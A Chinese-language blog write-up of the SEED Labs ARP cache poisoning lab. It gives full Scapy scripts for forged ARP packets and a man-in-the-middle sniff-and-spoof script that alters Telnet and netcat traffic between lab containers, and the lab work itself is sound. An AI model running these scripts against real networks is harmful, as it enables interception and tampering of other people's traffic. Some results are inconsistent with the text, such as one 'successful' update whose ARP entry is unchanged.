---
layout:     post
title:      "ARP Cache Poisoning"
date:       2022-10-01 00:00:00 +0800
categories: 实验
tags:       seedlab arp
summary:    "本文为 SEED Labs 2.0 - ARP Cache Poisoning Attack Lab 的实验记录，介绍了如何利用 ARP 缓存中毒实现中间人攻击 (MITM)。"
series:     SEEDLabs
series_index: 7
mathjax:    true
---

本文为 [SEED Labs 2.0 - ARP Cache Poisoning Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Networking/ARP_Attack/) 的实验记录。

## 实验原理

地址解析协议 (ARP) 是一种通信协议，用于在给定 IP 地址的情况下发现链路层地址，例如 MAC 地址。ARP 协议是一个非常简单的协议，它没有实施任何安全措施。ARP 缓存中毒攻击是针对 ARP 协议的常见攻击。使用这种攻击，攻击者可以欺骗受害者接受伪造的 IP 到 MAC 映射。这可能会导致受害者的数据包被重定向到具有伪造 MAC 地址的计算机，从而导致潜在的中间人攻击。本实验的目的是获得有关 ARP 缓存中毒攻击的第一手经验，并了解此类攻击可能造成的损害。我们将使用 ARP 攻击发起中间人攻击，攻击者可以拦截和修改两个受害者 A 和 B 之间的数据包。本实验的另一个目的是练习数据包嗅探和欺骗技能，因为这些是网络安全中必不可少的技能，它们是许多网络攻击和防御工具的构建块。我们将使用 Scapy 执行实验室任务。本实验涵盖以下主题：

- ARP 协议
- ARP 缓存中毒攻击
- 中间人攻击
- Scapy 编程

## Task 1: ARP Cache Poisoning

我们启动 docker：

```shell
dcbuild
dcup
```

启动对应的 shell 后，我们修改一下以便操作：

```shell
# export PS1="\w A-10.9.0.5$ "
```

```shell
# export PS1="\w B-10.9.0.6$ "
```

```shell
# export PS1="\w M-10.9.0.105$ "
```

<img src="/assets/post/images/arp1.svg" alt="arp1" style="width:min(100%,400px);" />

### Task 1.A using ARP request

首先查看三台机器的 ip 和 mac：

```shell
A-10.9.0.5$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:09:00:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.9.0.5/24 brd 10.9.0.255 scope global eth0
       valid_lft forever preferred_lft forever
```

```shell
B-10.9.0.6$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
10: eth0@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:09:00:06 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.9.0.6/24 brd 10.9.0.255 scope global eth0
       valid_lft forever preferred_lft forever
```

```shell
M-10.9.0.105$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:09:00:69 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.9.0.105/24 brd 10.9.0.255 scope global eth0
       valid_lft forever preferred_lft forever
```

编写 `arp.py`：

```python
#!/usr/bin/python3 
from scapy.all import * 

A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

eth = Ether(src=M_mac,dst='ff:ff:ff:ff:ff:ff') 
arp = ARP(hwsrc=M_mac, psrc=B_ip,
          hwdst=A_mac, pdst=A_ip,
          op=1) 

pkt = eth / arp 
sendp(pkt)
```

这里的 `A_ip`、`A_mac` 等就是我们上面查看到的内容。

在 `M` 中运行：

```shell
M-10.9.0.105$ arp.py
.
Sent 1 packets.
```

通过 wireshark 抓包可以看到：

![arp2](/assets/post/images/arp2.webp)

此时 `A` 中新增了 arp 记录：

```shell
A-10.9.0.5$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
B-10.9.0.6.net-10.9.0.0  ether   02:42:0a:09:00:69   C                     eth0
```

说明我们的 arp 请求发送成功。

### Task 1.B using ARP reply

修改程序：

```python
#!/usr/bin/python3 
from scapy.all import * 

A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

eth = Ether(src=M_mac,dst=A_mac) 
arp = ARP(hwsrc=M_mac, psrc=B_ip,
          hwdst=A_mac, pdst=A_ip,
          op=2) 

pkt = eth / arp 
sendp(pkt)
```

> Scenario 1: `B`’s IP is already in `A`’s cache.

首先，在 `B` 上 ping `A`：

```shell
B-10.9.0.6$ ping 10.9.0.5 -c 1
PING 10.9.0.5 (10.9.0.5) 56(84) bytes of data.
64 bytes from 10.9.0.5: icmp_seq=1 ttl=64 time=0.138 ms

--- 10.9.0.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.138/0.138/0.138/0.000 ms
```

此时，`A` 上看到：

```shell
A-10.9.0.5$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
```

然后运行：

```shell
M-10.9.0.105$ arp.py
.
Sent 1 packets.
```

抓包得到：

![arp3](/assets/post/images/arp3.webp)

此时 `A` 上的记录被更新：

```shell
A-10.9.0.5$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
```

修改成功。

> Scenario 2: `B`’s IP is not in `A`’s cache.

首先删除 `A` 的 arp 中关于 `B` 的记录：

```shell
A-10.9.0.5$ arp -d 10.9.0.6
```

然后再次运行：

```shell
M-10.9.0.105$ arp.py
.
Sent 1 packets.
```

抓包得到：

![arp4](/assets/post/images/arp4.webp)

此时 `A` 上的记录没有变化：

```shell
A-10.9.0.5$ arp -n
```

可见 reply 消息只能更新内容，却不能新建。

### Task 1.C using ARP gratuitous message

修改程序：

```python
#!/usr/bin/python3 
from scapy.all import * 

A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

eth = Ether(src=M_mac,dst='ff:ff:ff:ff:ff:ff') 
arp = ARP(hwsrc=M_mac, psrc=B_ip,
          hwdst='ff:ff:ff:ff:ff:ff', pdst=B_ip,
          op=1) 

pkt = eth / arp 
sendp(pkt)
```

> Scenario 1: `B`’s IP is already in `A`’s cache.

首先，在 `B` 上 ping `A`：

```shell
B-10.9.0.6$ ping 10.9.0.5 -c 1
PING 10.9.0.5 (10.9.0.5) 56(84) bytes of data.
64 bytes from 10.9.0.5: icmp_seq=1 ttl=64 time=0.138 ms

--- 10.9.0.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.138/0.138/0.138/0.000 ms
```

此时，`A` 上看到：

```shell
A-10.9.0.5$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
```

然后运行：

```shell
M-10.9.0.105$ arp.py
.
Sent 1 packets.
```

抓包得到：

![arp5](/assets/post/images/arp5.webp)

此时 `A` 上的记录被更新：

```shell
A-10.9.0.5$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
```

修改成功。

> Scenario 2: B’s IP is not in A’s cache.

首先删除 `B` 的记录：

```shell
A-10.9.0.5$ arp -d 10.9.0.6
```

然后再次运行：

```shell
M-10.9.0.105$ arp.py
.
Sent 1 packets.
```

抓包得到：

![arp6](/assets/post/images/arp6.webp)

此时 `A` 上的记录没有变化：

```shell
A-10.9.0.5$ arp -n
```

可见该情况和 reply 的结果是一样的。

## Task 2: MITM Attack on Telnet using ARP Cache Poisoning

### Step 1 Launch the ARP cache poisoning attack

修改程序：

```shell
#!/usr/bin/python3 
from scapy.all import * 

A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

ethA = Ether(src=M_mac,dst=A_mac) 
arpA = ARP(hwsrc=M_mac, psrc=B_ip,
           hwdst=A_mac, pdst=A_ip,
           op=2) 
ethB = Ether(src=M_mac,dst=B_mac) 
arpB = ARP(hwsrc=M_mac, psrc=A_ip,
           hwdst=A_mac, pdst=B_ip,
           op=2) 

while True:
    pktA = ethA / arpA
    sendp(pktA, count=1)
    pktB = ethB / arpB
    sendp(pktB, count=1)
    time.sleep(5)
```

首先从 `B` ping `A` 并查看 `A` 的 arp 的变化：

```shell
B-10.9.0.6$ ping 10.9.0.5 -c 1
PING 10.9.0.5 (10.9.0.5) 56(84) bytes of data.
64 bytes from 10.9.0.5: icmp_seq=1 ttl=64 time=0.088 ms

--- 10.9.0.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.088/0.088/0.088/0.000 ms
/ B-10.9.0.6$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.5                 ether   02:42:0a:09:00:05   C                     eth0
```

```shell
A-10.9.0.5$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
```

运行程序后再查看 `A` 的 arp 和 `B` 的 arp：

```shell
M-10.9.0.105$ arp.py
.
Sent 1 packets.
.
Sent 1 packets.
```

```shell
A-10.9.0.5$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
```

```shell
B-10.9.0.6$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.5                 ether   02:42:0a:09:00:69   C                     eth0
```

### Step 2 Testing

首先关闭转发：

```shell
M-10.9.0.105$ sysctl net.ipv4.ip_forward=0
net.ipv4.ip_forward = 0
```

然后运行：

```shell
M-10.9.0.105$ arp.py
.
Sent 1 packets.
.
Sent 1 packets.
```

`A` 和 `B` 互相 ping：

```shell
A-10.9.0.5$ ping 10.9.0.6 -c 1
PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.

--- 10.9.0.6 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```

```shell
B-10.9.0.6$ ping 10.9.0.5 -c 1
PING 10.9.0.5 (10.9.0.5) 56(84) bytes of data.

--- 10.9.0.5 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```

发现 ping 不通。

### Step 3 Turn on IP forwarding

首先开启转发：

```shell
M-10.9.0.105$ sysctl net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1
```

然后运行：

```shell
M-10.9.0.105$ arp.py
.
Sent 1 packets.
.
Sent 1 packets.
```

`A` 和 `B` 互相 ping：

```shell
A-10.9.0.5$ ping 10.9.0.6 -c 1
PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
64 bytes from 10.9.0.6: icmp_seq=1 ttl=63 time=0.122 ms

--- 10.9.0.6 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.122/0.122/0.122/0.000 ms
```

```shell
B-10.9.0.6$ ping 10.9.0.5 -c 1
PING 10.9.0.5 (10.9.0.5) 56(84) bytes of data.
64 bytes from 10.9.0.5: icmp_seq=1 ttl=63 time=0.076 ms

--- 10.9.0.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.076/0.076/0.076/0.000 ms
```

发现 ping 得通。

### Step 4 Launch the MITM attack

保持 ip 转发开启，先运行：

```shell
M-10.9.0.105$ arp.py
.
Sent 1 packets.
.
Sent 1 packets.
```

然后开启 telnet：

```shell
A-10.9.0.5$ telnet 10.9.0.6
Trying 10.9.0.6...
Connected to 10.9.0.6.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
1ec98edb592d login: seed
Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

seed@1ec98edb592d:~$
```

然后关闭 ip 转发：

```shell
M-10.9.0.105$ sysctl net.ipv4.ip_forward=0
net.ipv4.ip_forward = 0
```

此时，在 `A` 中输入内容，无法显示。

编写 `sniff_and spoof.py`：

```python
#!/usr/bin/env python3
from scapy.all import *
import re

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            data = data.decode()
            newdata = re.sub(r'[a-zA-Z]', r'Z', data)
            print(data + " ==> " + newdata)
            send(newpkt/newdata, verbose=False)
        else:
            send(newpkt, verbose=False)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt, verbose=False)

f = 'tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)'
pkt = sniff(filter=f, prn=spoof_pkt)
```

运行：

```shell
M-10.9.0.105$ sniff_and_spoof.py
```

在 `A` 中输入任意内容，可以看到，全部改成了 Z：

```shell
seed@1ec98edb592d:~$ ZZZZZ
```

`M` 中显示：

```shell
M-10.9.0.105$ sniff_and_spoof.py
l ==> Z
s ==> Z
 ==> 
```

攻击成功。

## Task 3: MITM Attack on Netcat using ARP Cache Poisoning

保持 `arp.py` 运行，然后 `B` 开启端口监听：

```shell
B-10.9.0.6$ nc -lp 9090
```

`A` 连接 `B`：

```shell
A-10.9.0.5$ nc 10.9.0.6 9090
```

此时，两者可以正常通信。

修改 `sniff_and spoof.py`：

```python
#!/usr/bin/env python3
from scapy.all import *
import re

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            newdata = data.replace(b'Chenyang', b'Yangchen')
            print(str(data) + " ==> " + str(newdata))
            newpkt[IP].len = pkt[IP].len + len(newdata) - len(data)
            send(newpkt/newdata, verbose=False)
        else:
            send(newpkt, verbose=False)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt, verbose=False)

f = 'tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)'
pkt = sniff(filter=f, prn=spoof_pkt)
```

运行：

```shell
M-10.9.0.105$ sniff_and_spoof.py
```

重新在 `A` 中发送：

```shell
A-10.9.0.5$ nc 10.9.0.6 9090
aaa
Chenyang
```

`B` 中收到：

```shell
B-10.9.0.6$ nc -lp 9090
aaa
Yangchen
```

`M` 显示：

```shell
M-10.9.0.105$ sniff_and_spoof.py
b'aaa\n' ==> b'aaa\n'
b'Chenyang\n' ==> b'Yangchen\n'
```

可以看到，只要输入我的名字，就会被替换掉。

## 实验总结

本实验内容较为简单，需要注意的是每一个任务中源 mac、源 ip、目的 mac、目的 ip 以及 op 不要搞错了。
